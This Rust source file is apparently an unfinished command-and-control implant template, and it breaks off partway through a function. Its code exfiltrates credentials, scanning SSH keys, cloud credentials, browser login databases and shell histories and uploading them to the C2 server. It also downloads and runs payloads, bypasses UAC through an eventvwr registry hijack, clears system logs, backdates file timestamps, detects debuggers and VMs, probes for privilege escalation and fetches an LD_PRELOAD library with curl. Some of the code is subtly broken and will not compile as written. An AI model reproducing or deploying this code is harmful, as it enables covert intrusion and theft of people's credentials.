use aes::Aes256;
use cfb_mode::{Cfb, Encryptor, Decryptor};
use rand::Rng;
use base64::{engine::general_purpose, Engine as _};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::fs::{self, File, OpenOptions};
use std::io::{self, Read, Write, BufRead, BufReader};
use std::net::{TcpStream, IpAddr, Ipv4Addr, SocketAddr};
use std::os::unix::fs::PermissionsExt;
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};
use std::sync::{Arc, Mutex, RwLock};
use std::thread;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use regex::Regex;
use reqwest::blocking::multipart;
use reqwest::header::{HeaderMap, HeaderValue};
use reqwest::blocking::Client;
use tar::Builder;
use flate2::write::GzEncoder;
use flate2::Compression;
use crossbeam::channel::{bounded, Sender, Receiver};
use uuid::Uuid;
use std::env;
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::mpsc;

lazy_static::lazy_static! {
    static ref ENCRYPTION_CTX: RwLock<Option<PacketEncryptionContext>> = RwLock::new(None);
    static ref STEALTH_MODE_ENABLED: AtomicBool = AtomicBool::new(false);
    static ref IAM_GROOT: AtomicBool = AtomicBool::new(false);
    static ref DISCOVERED_LIVE_HOSTS: RwLock<String> = RwLock::new(String::new());
    static ref RESULTS_PORTSCAN: RwLock<HashMap<String, Vec<i32>>> = RwLock::new(HashMap::new());
    static ref PROXY_CANCEL_FUNCS: Arc<Mutex<HashMap<String, mpsc::Sender<()>>>> = Arc::new(Mutex::new(HashMap::new()));
    static ref GLOBAL_IP: RwLock<String> = RwLock::new(String::new());
}

const C2_URL: &str = "https://{lhost}:{lport}";
const CLIENT_ID: &str = "{line}";
const USERNAME: &str = "{username}";
const PASSWORD: &str = "{password}";
const SLEEP: u64 = {sleep};
const MALEABLE: &str = "{maleable}";
const USER_AGENT: &str = "{useragent}";
const MAX_RETRIES: u32 = 3;
const STEALTH: &str = "{stealth}";
const LHOST: &str = "{lhost}";
const DESIRED_LD_PRELOAD: &str = "/dev/shm/mrhyde.so";

const USER_AGENTS: [&str; 4] = [
    "{useragent}",
    "{user_agent_1}",
    "{user_agent_2}",
    "{user_agent_3}",
];

const URLS: [&str; 3] = [
    "{url_trafic_1}",
    "{url_trafic_2}",
    "{url_trafic_3}",
];

const HEADERS: [(&str, &str); 3] = [
    ("Accept", "application/json"),
    ("Content-Type", "application/json"),
    ("Connection", "keep-alive"),
];

const DEBUG_TOOLS: [(&str, [&str]); 3] = [
    ("windows", ["x64dbg", "ollydbg", "ida", "windbg", "processhacker", "csfalcon", "cbagent", "msmpeng"]),
    ("linux", ["gdb", "strace", "ltrace", "radare2"]),
    ("darwin", ["lldb", "dtrace", "instruments"]),
];

#[derive(Clone)]
struct Aes256Key {
    key: Vec<u8>,
}

#[derive(Clone)]
struct PacketEncryptionContext {
    aes_key: Aes256Key,
    valid: bool,
    enabled: bool,
}

#[derive(Serialize, Deserialize, Default)]
struct LazyDataType {
    reverse_shell_port: i32,
    rhost: String,
    debug_implant: String,
    beacon_scan_ports: Vec<i32>,
}

#[derive(Clone)]
struct HostResult {
    ip: String,
    alive: bool,
    interface: String,
}

fn random_select_str(slice: &[&str]) -> String {
    let mut rng = rand::thread_rng();
    slice[rng.gen_range(0..slice.len())].to_string()
}

fn get_global_ip() -> String {
    let resolvers = [
        "https://api.ipify.org?format=text",
        "http://myexternalip.com/raw",
        "http://ident.me",
        "https://ifconfig.me",
        "https://ifconfig.co",
    ];
    let client = Client::builder()
        .timeout(Duration::from_secs(10))
        .build()
        .unwrap();

    loop {
        let url = random_select_str(&resolvers);
        match client.get(url).send() {
            Ok(resp) if resp.status().is_success() => {
                if let Ok(ip) = resp.text() {
                    return ip.trim().to_string();
                }
            }
            Err(e) => eprintln!("Error fetching IP from {}: {}", url, e),
        }
    }
}

fn clean_system_logs(lazyconf: &LazyDataType) -> Result<(), String> {
    let cmd = if cfg!(target_os = "windows") {
        "wevtutil cl System && wevtutil cl Security"
    } else {
        "truncate -s 0 /var/log/syslog /var/log/messages 2>/dev/null"
    };
    let shell_command = get_shell_command("-c");
    let (output, err) = execute_command_with_retry(&shell_command, cmd)?;
    if let Some(e) = err {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Failed to clean system logs: {}, output: {}", e, output);
        }
        return Err(e.to_string());
    }
    if lazyconf.debug_implant == "True" {
        println!("[INFO] System logs cleaned");
    }
    Ok(())
}

fn start_proxy(lazyconf: &LazyDataType, listen_addr: &str, target_addr: String) -> Result<(), String> {
    let (tx, rx) = mpsc::channel();
    {
        let mut proxies = PROXY_CANCEL_FUNCS.lock().unwrap();
        proxies.insert(listen_addr.to_string(), tx);
    }

    thread::spawn(move || {
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Starting proxy: listen={}, target={}", listen_addr, target_addr);
        }

        let listener = match std::net::TcpListener::bind(listen_addr) {
            Ok(l) => l,
            Err(e) => {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Failed to start proxy on {}: {}", listen_addr, e);
                }
                return;
            }
        };

        if lazyconf.debug_implant == "True" {
            println!("[INFO] Proxy listening on {}, forwarding to {}", listen_addr, target_addr);
        }

        loop {
            select! {
                _ = rx.recv() => {
                    if lazyconf.debug_implant == "True" {
                        println!("[INFO] Stopping proxy on {}", listen_addr);
                    }
                    break;
                }
                Ok((client, _)) = listener.accept() => {
                    let target_addr = target_addr.clone();
                    thread::spawn(move || {
                        let target = match TcpStream::connect(&target_addr) {
                            Ok(t) => t,
                            Err(e) => {
                                if lazyconf.debug_implant == "True" {
                                    eprintln!("[ERROR] Failed to connect to target {}: {}", target_addr, e);
                                }
                                return;
                            }
                        };
                        let (mut client_reader, mut client_writer) = (client.try_clone().unwrap(), client);
                        let (mut target_reader, mut target_writer) = (target.try_clone().unwrap(), target);
                        thread::spawn(move || io::copy(&mut client_reader, &mut target_writer).unwrap());
                        io::copy(&mut target_reader, &mut client_writer).unwrap();
                    });
                }
                Err(e) => {
                    if lazyconf.debug_implant == "True" {
                        eprintln!("[ERROR] Proxy accept error: {}", e);
                    }
                }
            }
        }
    });
    Ok(())
}

fn stop_proxy(listen_addr: &str, lazyconf: &LazyDataType) -> Result<(), String> {
    let proxies = PROXY_CANCEL_FUNCS.lock().unwrap();
    if let Some(tx) = proxies.get(listen_addr) {
        let _ = tx.send(());
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Proxy stopped on {}", listen_addr);
        }
        Ok(())
    } else {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] No proxy running on {}", listen_addr);
        }
        Err(format!("no proxy running on {}", listen_addr))
    }
}

fn get_useful_software() -> Result<Vec<String>, String> {
    let binaries = [
        "docker", "nc", "netcat", "python", "python3", "php", "perl", "ruby", "gcc", "g++",
        "ping", "base64", "socat", "curl", "wget", "certutil", "xterm", "gpg", "mysql", "ssh",
    ];
    let mut discovered_software = Vec::new();
    for binary in binaries.iter() {
        if let Ok(path) = which::which(binary) {
            discovered_software.push(path.to_string_lossy().into_owned());
        }
    }
    Ok(discovered_software)
}

fn handle_adversary(
    ctx: &tokio::sync::oneshot::Sender<()>,
    command: &str,
    lazyconf: &LazyDataType,
    current_port_scan_results: &HashMap<String, Vec<i32>>,
) -> Result<(), String> {
    if STEALTH_MODE_ENABLED.load(Ordering::SeqCst) {
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Adversary command skipped: stealth mode enabled");
        }
        return Ok(());
    }

    let id_atomic = command.strip_prefix("adversary:").ok_or_else(|| "Invalid command format")?;
    if id_atomic.len() != 36 {
        let err = format!("invalid id_atomic: {}", id_atomic);
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] {}", err);
        }
        return Err(err);
    }

    let (script_ext, script_prefix, shell_command) = if cfg!(target_os = "windows") {
        (".ps1", "powershell -Command .\\", vec!["powershell", "-Command"])
    } else {
        (".sh", "bash ", vec!["bash", "-c"])
    };

    let test_script = format!("atomic_test_{}{}", id_atomic, script_ext);
    let test_script_path = PathBuf::from(&test_script);
    let download_cmd = format!("download:{}", test_script);
    handle_download(&download_cmd)?;
    if !test_script_path.exists() {
        let err = format!("failed to download test script: {}", test_script);
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] {}", err);
        }
        return Err(err);
    }

    obfuscate_file_timestamps(lazyconf, &test_script_path.to_string_lossy())?;

    let execute_cmd = format!("{}{}", script_prefix, test_script_path.display());
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Executing atomic test: {}", execute_cmd);
    }
    let shell_command = shell_command.iter().map(|s| s.to_string()).collect::<Vec<_>>();
    thread::spawn(move || {
        if let Err(e) = run_script(&execute_cmd, &shell_command, lazyconf) {
            if lazyconf.debug_implant == "True" {
                eprintln!("[ERROR] Test script execution failed: {}", e);
            }
        }
    });

    let clean_script = format!("atomic_clean_test_{}{}", id_atomic, script_ext);
    let clean_script_path = PathBuf::from(env::temp_dir()).join(&clean_script);
    let download_cmd = format!("download:{}", clean_script);
    handle_download(&download_cmd)?;
    if clean_script_path.exists() {
        obfuscate_file_timestamps(lazyconf, &clean_script_path.to_string_lossy())?;
        let execute_cmd = format!("{}{}", script_prefix, clean_script_path.display());
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Executing cleanup script: {}", execute_cmd);
        }
        thread::spawn(move || {
            if let Err(e) = run_script(&execute_cmd, &shell_command, lazyconf) {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Cleanup script execution failed: {}", e);
                }
            }
        });
    } else if lazyconf.debug_implant == "True" {
        println!("[WARN] Failed to download cleanup script: {}", clean_script);
    }

    fs::remove_file(&test_script_path).ok();
    fs::remove_file(&clean_script_path).ok();

    if lazyconf.debug_implant == "True" {
        println!("[INFO] Adversary command completed for id_atomic: {}", id_atomic);
    }
    Ok(())
}

fn run_script(command: &str, shell_command: &[String], lazyconf: &LazyDataType) -> Result<(), String> {
    let mut cmd = Command::new(&shell_command[0]);
    for arg in shell_command.iter().skip(1) {
        cmd.arg(arg);
    }
    cmd.arg(command);
    let output = cmd.output().map_err(|e| format!("failed to start script: {}", e))?;
    let stdout = String::from_utf8_lossy(&output.stdout).into_owned();
    let stderr = String::from_utf8_lossy(&output.stderr).into_owned();
    let combined_output = format!("{}\n{}", stdout, stderr);

    if !output.status.success() {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Script execution failed: {}", combined_output);
        }
    }

    let pid = std::process::id();
    let hostname = hostname::get()
        .map(|h| h.to_string_lossy().into_owned())
        .unwrap_or_default();
    let ips = get_ips();
    let current_user = whoami::username();

    let json_data = serde_json::json!({
        "output": combined_output,
        "client": std::env::consts::OS,
        "command": command,
        "pid": pid.to_string(),
        "hostname": hostname,
        "ips": ips.join(", "),
        "user": current_user,
        "discovered_ips": DISCOVERED_LIVE_HOSTS.read().unwrap().clone(),
        "result_portscan": null::<Vec<()>>,
    });

    if lazyconf.debug_implant == "True" {
        println!("[INFO] JSON Data (Formatted):\n{}", serde_json::to_string_pretty(&json_data).unwrap());
    }

    retry_request(&format!("{}{}{}", C2_URL, MALEABLE, CLIENT_ID), "POST", &json_data.to_string(), "")?;
    Ok(())
}

fn download_and_execute(file_url: &str, lazyconf: &LazyDataType) {
    thread::spawn(move || {
        let client = Client::builder()
            .timeout(Duration::from_secs(30))
            .build()
            .unwrap();

        let file_path = if cfg!(target_os = "windows") {
            let appdata = env::var("APPDATA").unwrap_or_default();
            format!("{}\\payload.exe", appdata)
        } else {
            let file_name = Path::new(file_url).file_name().unwrap().to_string_lossy();
            format!("/dev/shm/{}", file_name)
        };

        let resp = match client.get(file_url).send() {
            Ok(r) if r.status().is_success() => r,
            Ok(r) => {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Failed to download file from {}, status code: {}", file_url, r.status());
                }
                return;
            }
            Err(e) => {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Error downloading file from {}: {}", file_url, e);
                }
                return;
            }
        };

        let mut file = match OpenOptions::new()
            .write(true)
            .create(true)
            .truncate(true)
            .open(&file_path)
        {
            Ok(f) => f,
            Err(e) => {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Error creating file {}: {}", file_path, e);
                }
                return;
            }
        };

        if cfg!(not(target_os = "windows")) {
            let metadata = file.metadata().unwrap();
            let mut permissions = metadata.permissions();
            permissions.set_mode(0o755);
            file.set_permissions(permissions).unwrap();
        }

        if let Err(e) = io::copy(&mut resp.bytes().unwrap().as_ref(), &mut file) {
            if lazyconf.debug_implant == "True" {
                eprintln!("[ERROR] Error saving file to {}: {}", file_path, e);
            }
            return;
        }

        if cfg!(target_os = "windows") {
            if let Err(e) = execute_uac_bypass(&file_path, lazyconf) {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Error executing UAC bypass: {}", e);
                }
                return;
            }
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Payload executed via UAC bypass: {}", file_path);
            }
        } else {
            let mut cmd = Command::new(&file_path);
            if let Err(e) = cmd.spawn() {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Error starting executable {}: {}", file_path, e);
                }
                return;
            }
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Background process started: {}", file_path);
            }
        }
    });
}

fn execute_uac_bypass(file_path: &str, lazyconf: &LazyDataType) -> Result<(), String> {
    if !cfg!(target_os = "windows") {
        if lazyconf.debug_implant == "True" {
            println!("[WARNING] UAC bypass is not applicable on non-Windows platforms");
        }
        return Err("UAC bypass not supported on this platform".to_string());
    }

    let cmd = Command::new("cmd")
        .args(&["/Q", "/C", "reg", "add", "HKCU\\Software\\Classes\\mscfile\\shell\\open\\command", "/d", file_path])
        .output()
        .map_err(|e| format!("error setting registry key: {}", e))?;

    if !cmd.status.success() {
        return Err(format!("error setting registry key: {}", String::from_utf8_lossy(&cmd.stderr)));
    }

    let cmd = Command::new("cmd")
        .args(&["/C", "eventvwr.exe"])
        .status()
        .map_err(|e| format!("error running eventvwr.exe: {}", e))?;

    if !cmd.success() {
        return Err("error running eventvwr.exe".to_string());
    }

    let cmd = Command::new("cmd")
        .args(&["/Q", "/C", "reg", "delete", "HKCU\\Software\\Classes\\mscfile", "/f"])
        .output()
        .map_err(|e| format!("error deleting registry key: {}", e))?;

    if !cmd.status.success() {
        return Err(format!("error deleting registry key: {}", String::from_utf8_lossy(&cmd.stderr)));
    }

    Ok(())
}

fn obfuscate_file_timestamps(lazyconf: &LazyDataType, file_path: &str) -> Result<(), String> {
    let old_time = SystemTime::now()
        .checked_sub(Duration::from_secs(365 * 24 * 60 * 60))
        .unwrap();
    let metadata = fs::metadata(file_path).map_err(|e| format!("failed to get metadata: {}", e))?;
    let permissions = metadata.permissions();
    filetime::set_file_times(file_path, old_time, old_time)
        .map_err(|e| format!("failed to obfuscate timestamps for {}: {}", file_path, e))?;
    fs::set_permissions(file_path, permissions).map_err(|e| format!("failed to restore permissions: {}", e))?;
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Timestamps obfuscated for {} to {:?}", file_path, old_time);
    }
    Ok(())
}

fn handle_exfiltrate(command: &str, lazyconf: &LazyDataType) {
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Executing file scraping...");
    }

    let home_dir = dirs::home_dir().unwrap_or_default();
    let sensitive_files = [
        ".bash_history", ".ssh/id_rsa", ".ssh/id_dsa", ".ssh/id_ecdsa", ".ssh/id_ed25519",
        "Desktop/*.log", ".ssh/authorized_keys", ".aws/credentials", ".aws/config*",
        ".zsh_history", ".config/fish/fish_history", ".gnupg/secring.gpg", ".gnupg/pubring.gpg",
        ".password-store/*", ".keepassxc/*.kdbx", "Documents/*.kdbx", "Downloads/github-recovery-codes.txt",
        "Descargas/github-recovery-codes.txt", ".config/google-chrome/Default/Login Data",
        ".mozilla/firefox/*/key4.db", ".mozilla/firefox/*/logins.json", ".config/microsoft/Edge/Default/Login Data",
        "Library/Application Support/BraveSoftware/*/Login Data", "Library/Application Support/Google/Chrome/Default/Login Data",
        "~/Library/Safari/Bookmarks.plist", "AppData/Local/Google/Chrome/User Data/Default/Login Data",
        "AppData/Roaming/Mozilla/Firefox/Profiles/*/key4.db", "AppData/Roaming/Mozilla/Firefox/Profiles/*/logins.json",
        "AppData/Local/Microsoft/Edge/User Data/Default/Login Data", "AppData/Roaming/*.ps1_history.txt",
        ".purple/accounts.xml", ".irssi/config", ".mutt/*", ".abook/abook", ".thunderbird/*/prefs.js",
        ".thunderbird/*/Mail/*/*", ".wireshark/recent", ".config/transmission/torrents.json",
        ".wget-hsts", ".git-credentials", ".npmrc", ".yarnrc", ".bundle/config", ".gem/*/credentials",
        ".pypirc", ".ssh/config", "~/.aws/config", "~/.oci/config", "~/.kube/config",
        "~/.docker/config.json", "~/.netrc", "~/Library/Application Support/com.apple.iChat/Aliases",
        "~/Library/Messages/chat.db", "~/Library/Containers/com.apple.mail/Data/Library/Mail/V*/MailData/Accounts.plist",
        "~/Library/Containers/com.apple.Safari/Data/Library/Safari/Bookmarks.plist",
        "~/Library/Containers/com.apple.Safari/Data/Library/Safari/History.plist",
        "~/Library/Preferences/com.apple.finder.plist", "~/Library/Preferences/ByHost/com.apple.loginwindow.*.plist",
        "~/Library/Application Support/Code/User/settings.json", "~/Library/Application Support/Slack/local_store.json",
        "~/Library/Application Support/Telegram Desktop/tdata/*", "~/Library/Cookies/Cookies.binarycookies",
    ]
    .iter()
    .map(|p| home_dir.join(p).to_string_lossy().into_owned())
    .collect::<Vec<_>>();

    let password_patterns = vec![
        Regex::new(r"(?i)password\s*[:=]\s*"?(.+?)"?\s*$").unwrap(),
        Regex::new(r"(?i)passwd\s*[:=]\s*"?(.+?)"?\s*$").unwrap(),
    ];

    let (found_files_tx, found_files_rx) = bounded(10);
    let (error_tx, error_rx) = bounded(5);
    let wg = Arc::new(Mutex::new(0));

    let scan_path = |path: String, wg: Arc<Mutex<i32>>, found_files_tx: Sender<String>, error_tx: Sender<String>| {
        let _guard = scopeguard::guard((), |_| {
            let mut count = wg.lock().unwrap();
            *count -= 1;
        });

        if path.contains('*') {
            match glob::glob(&path) {
                Ok(entries) => {
                    for entry in entries.flatten() {
                        if is_sensitive_file(&entry.to_string_lossy(), &password_patterns) {
                            let _ = found_files_tx.send(entry.to_string_lossy().into_owned());
                        }
                    }
                }
                Err(e) => {
                    let _ = error_tx.send(format!("error processing glob pattern '{}': {}", path, e));
                }
            }
        } else {
            if is_sensitive_file(&path, &password_patterns) {
                let _ = found_files_tx.send(path);
            }
        }
    };

    for file in sensitive_files {
        let mut count = wg.lock().unwrap();
        *count += 1;
        drop(count);
        let wg = Arc::clone(&wg);
        let found_files_tx = found_files_tx.clone();
        let error_tx = error_tx.clone();
        thread::spawn(move || scan_path(file, wg, found_files_tx, error_tx));
    }

    drop(found_files_tx);
    drop(error_tx);

    thread::spawn(move || {
        while *wg.lock().unwrap() > 0 {
            thread::sleep(Duration::from_millis(100));
        }
    }).join().unwrap();

    for found_file in found_files_rx {
        if lazyconf.debug_implant == "True" {
            println!("[INFO] Found potentially sensitive file: {}", found_file);
        }
        upload_file(&found_file);
    }

    for err in error_rx {
        eprintln!("[ERROR] Error during file scraping: {}", err);
    }

    if lazyconf.debug_implant == "True" {
        println!("[INFO] File scraping finished.");
    }
}

fn compress_gzip_dir(input_dir: &str, output_file_path: &str, lazyconf: &LazyDataType) -> Result<(), String> {
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Starting directory compression: {} to {}", input_dir, output_file_path);
    }

    let output_file = File::create(output_file_path)
        .map_err(|e| format!("failed to create output file '{}': {}", output_file_path, e))?;
    let gz_encoder = GzEncoder::new(output_file, Compression::default());
    let mut tar_builder = Builder::new(gz_encoder);

    let input_path = Path::new(input_dir);
    for entry in walkdir::WalkDir::new(input_dir).into_iter().filter_map(Result::ok) {
        if entry.file_type().is_dir() {
            continue;
        }
        let path = entry.path();
        let relative_path = path.strip_prefix(input_path)
            .map_err(|e| format!("failed to get relative path: {}", e))?;
        let file = File::open(path)
            .map_err(|e| format!("failed to open file '{}': {}", path.display(), e))?;
        let metadata = file.metadata()
            .map_err(|e| format!("failed to get metadata for '{}': {}", path.display(), e))?;
        let header = tar::Header::new_gnu();
        let mut header = header;
        header.set_path(relative_path)
            .map_err(|e| format!("failed to set tar header path: {}", e))?;
        header.set_size(metadata.len());
        header.set_mode(metadata.permissions().mode());
        header.set_mtime(metadata.modified().unwrap().duration_since(UNIX_EPOCH).unwrap().as_secs());
        header.set_cksum();
        tar_builder.append(&header, file)
            .map_err(|e| format!("failed to append file '{}': {}", path.display(), e))?;
        if lazyconf.debug_implant == "True" {
            println!("[DEBUG] Adding file to archive: {}", path.display());
        }
    }

    tar_builder.finish()
        .map_err(|e| format!("failed to finish tar archive: {}", e))?;

    if lazyconf.debug_implant == "True" {
        println!("[INFO] Directory compression finished. Uploading: {}", output_file_path);
    }

    upload_file(output_file_path);
    Ok(())
}

fn is_sensitive_file(path: &str, password_patterns: &[Regex]) -> bool {
    let file_info = match fs::metadata(path) {
        Ok(info) if !info.is_dir() => info,
        _ => return false,
    };

    let filename = Path::new(path).file_name().unwrap().to_string_lossy();
    if filename.contains("id_rsa") || filename.contains("id_dsa") ||
       filename.contains("id_ecdsa") || filename.contains("id_ed25519") ||
       filename == ".bash_history" {
        return true;
    }

    let file = match File::open(path) {
        Ok(f) => f,
        Err(e) => {
            eprintln!("[WARNING] Could not open file '{}' for password scanning: {}", path, e);
            return false;
        }
    };
    let reader = BufReader::new(file);
    for line in reader.lines().flatten() {
        for pattern in password_patterns {
            if pattern.is_match(&line) {
                return true;
            }
        }
    }
    false
}

fn upload_file(file_path: &str) {
    if !Path::new(file_path).exists() {
        eprintln!("[WARNING] File not found for upload: {}", file_path);
        return;
    }
    if let Err(e) = retry_request(&format!("{}{}/upload", C2_URL, MALEABLE), "POST", "", file_path) {
        eprintln!("[ERROR] Failed to upload file '{}': {}", file_path, e);
    } else {
        println!("[INFO] Successfully uploaded file: {}", Path::new(file_path).file_name().unwrap().to_string_lossy());
    }
}

fn port_scanner(ips: &str, ports: &[i32], timeout: Duration) -> HashMap<String, Vec<i32>> {
    let ip_list = ips.replace(" ", "").split(',').collect::<Vec<_>>();
    println!("[INFO] Starting port scan on {} IPs...", ips);
    let results = Arc::new(Mutex::new(HashMap::new()));
    let (tx, rx) = bounded(100);

    for ip in ip_list {
        for &port in ports {
            let ip = ip.to_string();
            let tx = tx.clone();
            thread::spawn(move || {
                let addr = format!("{}:{}", ip, port).parse::<SocketAddr>().ok();
                let open = addr.and_then(|a| TcpStream::connect_timeout(&a, timeout).ok()).is_some();
                let _ = tx.send((ip, port, open));
            });
        }
    }

    drop(tx);
    for (ip, port, open) in rx {
        if open {
            let mut results = results.lock().unwrap();
            results.entry(ip).or_insert_with(Vec::new).push(port);
        }
    }

    results.lock().unwrap().clone()
}

fn is_root() -> bool {
    cfg!(any(target_os = "linux", target_os = "macos")) && unsafe { libc::getuid() } == 0
}

fn ping_host(ip: &str, iface: &str, timeout: Duration, tx: Sender<HostResult>) {
    let cmd = Command::new("ping")
        .args(&["-c", "1", "-W", &timeout.as_secs().to_string(), ip])
        .status();
    let alive = cmd.map(|s| s.success()).unwrap_or(false);
    let _ = tx.send(HostResult {
        ip: ip.to_string(),
        alive,
        interface: iface.to_string(),
    });
}

fn generate_ip_range(ip_net: &std::net::IpNet) -> Result<Vec<String>, String> {
    let ip = match ip_net.ip() {
        IpAddr::V4(ip) => ip,
        _ => return Err("IPv4 only supported".to_string()),
    };
    let mask = ip_net.mask();
    let start = ip_to_int(ip);
    let ones = mask.iter().map(|b| b.count_ones()).sum::<u32>();
    let num_ips = 1u32 << (32 - ones);

    let mut ips = Vec::new();
    for i in 0..num_ips {
        ips.push(int_to_ip(start + i).to_string());
    }
    Ok(ips)
}

fn ip_to_int(ip: Ipv4Addr) -> u32 {
    let octets = ip.octets();
    (octets[0] as u32) << 24 | (octets[1] as u32) << 16 | (octets[2] as u32) << 8 | octets[3] as u32
}

fn int_to_ip(n: u32) -> Ipv4Addr {
    Ipv4Addr::new(
        ((n >> 24) & 0xFF) as u8,
        ((n >> 16) & 0xFF) as u8,
        ((n >> 8) & 0xFF) as u8,
        (n & 0xFF) as u8,
    )
}

fn read_json_from_url<T: for<'de> Deserialize<'de>>(url: &str) -> Result<T, String> {
    let client = Client::builder()
        .timeout(Duration::from_secs(5))
        .danger_accept_invalid_certs(true)
        .build()
        .unwrap();
    let resp = client.get(url)
        .send()
        .map_err(|e| format!("error GET to {}: {}", url, e))?;
    if !resp.status().is_success() {
        let body = resp.text().unwrap_or_default();
        return Err(format!("Request {} error code: {}: {}", url, resp.status().as_u16(), body));
    }
    resp.json::<T>()
        .map_err(|e| format!("Error decoding JSON from {}: {}", url, e))
}

fn discover_local_hosts(lazyconf: &LazyDataType) {
    let timeout = Duration::from_secs(2);
    let (tx, rx) = bounded(100);
    let interfaces = pnet::datalink::interfaces();
    let rhost = lazyconf.rhost.clone();

    for iface in interfaces {
        if !iface.is_up() || iface.is_loopback() || iface.name == "docker0" {
            if lazyconf.debug_implant == "True" {
                println!("[DEBUG] Ignoring interface: {}", iface.name);
            }
            continue;
        }
        for ip in iface.ips {
            if let IpAddr::V4(ipv4) = ip.ip() {
                let ip_net = std::net::IpNet::from(std::net::IpAddr::V4(ipv4));
                if let Ok(subnet_ips) = generate_ip_range(&ip_net) {
                    for ip in subnet_ips {
                        let tx = tx.clone();
                        thread::spawn(move || ping_host(&ip, &iface.name, timeout, tx));
                    }
                }
            }
        }
    }

    let tx = tx.clone();
    thread::spawn(move || ping_host(&rhost, "tun0", timeout, tx));

    drop(tx);
    let mut live_hosts = Vec::new();
    for result in rx {
        if result.alive {
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Discovered Host (Startup): {} on interface {}", result.ip, result.interface);
            }
            live_hosts.push(result.ip);
        }
    }

    let mut discovered = DISCOVERED_LIVE_HOSTS.write().unwrap();
    *discovered = live_hosts.join(", ");
}

fn is_vm_by_mac() -> bool {
    let interfaces = pnet::datalink::interfaces();
    let vm_mac_prefixes = ["00:05:69", "00:0C:29", "00:50:56", "08:00:27", "52:54:00"];

    for iface in interfaces {
        if !iface.is_up() || iface.is_loopback() || iface.name == "docker0" {
            continue;
        }
        let mac = iface.mac.unwrap().to_string();
        for prefix in vm_mac_prefixes.iter() {
            if mac.starts_with(prefix) {
                return true;
            }
        }
    }
    false
}

fn if_root(lazyconf: &LazyDataType) -> bool {
    if lazyconf.debug_implant == "True" {
        println!("[INFO] Running with root privileges (Linux/macOS)");
    }
    IAM_GROOT.store(true, Ordering::SeqCst);
    let ld_preload = env::var("LD_PRELOAD").unwrap_or_default();
    let serv_url = "https://{lhost}/l_{line}";

    download_and_execute(serv_url, lazyconf);
    if ld_preload.is_empty() || ld_preload != DESIRED_LD_PRELOAD {
        if !Path::new(DESIRED_LD_PRELOAD).exists() {
            let cmd = Command::new("bash")
                .args(&["-c", &format!("curl -o /home/.grisun0/mrhyde.so http://{}/mrhyde.so", LHOST)])
                .status();
            if let Err(e) = cmd {
                eprintln!("Error downloading mrhyde.so: {}", e);
            }
        }
        env::set_var("LD_PRELOAD", DESIRED_LD_PRELOAD);
        return true;
    }
    false
}

fn try_privilege_escalation(lazyconf: &LazyDataType) {
    thread::spawn(move || {
        if !cfg!(target_os = "linux") {
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Privilege escalation check only supported on Linux");
            }
            return;
        }

        let shell_command = get_shell_command("-c");
        let (output, err) = execute_command_with_retry(&shell_command, "sudo -n -l").unwrap_or_default();
        if let Some(e) = err {
            if lazyconf.debug_implant == "True" {
                eprintln!("[ERROR] Failed to run sudo -l: {}", e);
            }
            return;
        }

        if output.contains("(ALL) NOPASSWD") {
            if lazyconf.debug_implant == "True" {
                println!("[INFO] Potential sudo privilege escalation detected: NOPASSWD found");
            }
            let (escalate_output, escalate_err) = execute_command_with_retry(&shell_command, "sudo -n whoami").unwrap_or_default();
            if escalate_err.is_none() && escalate_output.contains("root") {
                if lazyconf.debug_implant == "True" {
                    println!("[SUCCESS] Escalated to root via sudo NOPASSWD");
                }
            } else if let Some(e) = escalate_err {
                if lazyconf.debug_implant == "True" {
                    eprintln!("[ERROR] Failed to escalate via sudo: {}", e);
                }
            }
        } else if lazyconf.debug_implant == "True" {
            println!("[INFO] No NOPASSWD privileges detected");
        }

        check_setuid_binaries(lazyconf);
    });
}

fn check_setuid_binaries(lazyconf: &LazyDataType) {
    let shell_command = get_shell_command("-c");
    let (output, err) = execute_command_with_retry(&shell_command, "find / -perm -4000 -type f 2>/dev/null").unwrap_or_default();
    if let Some(e) = err {
        if lazyconf.debug_implant == "True" {
            eprintln!("[ERROR] Failed to check SUID binaries: {}", e);
        }
        return;
    }

    let exploitable_suid = ["/bin/su", "/usr/bin/passwd", "/usr/bin/gpasswd", "/usr/bin/chsh"];
    let found_suid = output
        .lines()
        .any(|binary| exploitable_suid.iter().any(|exploit| binary.contains(exploit)));
    
    if found_suid {
        for binary in output.lines() {
            for exploit in exploitable_suid.iter() {
                if binary.contains(exploit) {
                    if lazyconf.debug_implant == "True" {
                        println!("[INFO] Found exploitable SUID binary: {}", binary);
                    }
                }
            }
        }
    } else if lazyconf.debug_implant == "True" {
        println!("[INFO] No exploitable SUID binaries found");
    }
}

fn check_debuggers(lazyconf: &LazyDataType) -> bool {
    let cmd = if cfg!(target_os = "windows") {
        "tasklist"
    } else {
        "ps aux"
    };

    if cfg!(any(target_os = "linux", target_os = "macos")) {
        if is_root() {
            if_root(lazyconf);
        } else if lazyconf.debug_implant == "True" {
            println!("[INFO] Not running with root privileges (Linux/macOS)");
            IAM_GROOT.store(false, Ordering::SeqCst);
        }
    }

